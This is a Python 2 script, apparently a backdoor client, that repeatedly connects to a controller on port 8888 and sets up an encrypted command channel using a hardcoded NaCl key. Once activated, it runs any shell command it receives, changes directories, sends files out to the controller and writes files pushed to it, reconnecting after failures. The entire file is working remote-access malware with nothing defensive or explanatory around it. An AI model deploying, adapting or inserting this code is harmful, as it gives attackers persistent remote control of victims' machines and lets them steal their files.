#!/usr/bin/python
import socket,os
import sys
import nacl.secret
import nacl.utils
import time,os,subprocess

HOST = '0.0.0.0'   # Symbolic name, meaning all available interfaces
PORT = 8888 # Arbitrary non-privileged port

# This must be kept secret, this is the combination to your safe
key = '9SeT2kaxYlRYS675TxzHwB2el4Pa15A3'

# This is your safe, you can use it to encrypt or decrypt messages
box = nacl.secret.SecretBox(key)

# session controller
active = False

# Functions
###########

# send data function
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(box.encrypt(cmd + end))

# receive data function
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):

		decrypted = box.decrypt(l)
		print decrypted
		data = data + decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)

	return data[:-len(end)]

# upload file
def Upload(sock, filename):
	bgtr = True
	# file transfer
	try:
		f = open(filename, 'rb')
		while 1:
			fileData = f.read()
			if fileData == '': break
			# begin sending file
			Send(sock, fileData, "")
		f.close()
	except:
		time.sleep(0.1)
	# let server know we're done..
	time.sleep(0.8)
	Send(sock, "")
	time.sleep(0.8)
	return "Finished download."

# download file
def Download(sock, filename):
	# file transfer
	g = open(filename, 'wb')
	# download file
	fileData = Receive(sock)
	time.sleep(0.8)
	g.write(fileData)
	g.close()
	# let server know we're done..
	return "Finished upload."

# main loop
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))


		# waiting to be activated...
		data = Receive(s)

		# activate.
		if data == 'Activate':
			active = True
			Send(s, "\n"+os.getcwd()+">")

		# interactive loop
		while active:

			# Receive data
			data = Receive(s)

			# check for quit
			if data == "quit" or data == "terminate":
				Send(s, "quitted")
				break

			# check for change directory
			elif data.startswith("cd ") == True:
				os.chdir(data[3:])
				stdoutput = ""

			# check for download
			elif data.startswith("download ") == True:
				# Upload the file
				stdoutput = Upload(s, data[9:])

			# check for upload
			elif data.startswith("upload ") == True:
				# Download the file
				stdoutput = Download(s, data[7:])

			else:
				# execute command
				print
				proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

				# save output/error
				stdoutput = proc.stdout.read() + proc.stderr.read()

			# send data
			stdoutput = stdoutput+"\n"+os.getcwd()+">"
			Send(s, stdoutput)

		# loop ends here

		if data == "terminate":
			break
		time.sleep(3)
	except socket.error:
		s.close()
		time.sleep(10)
		continue
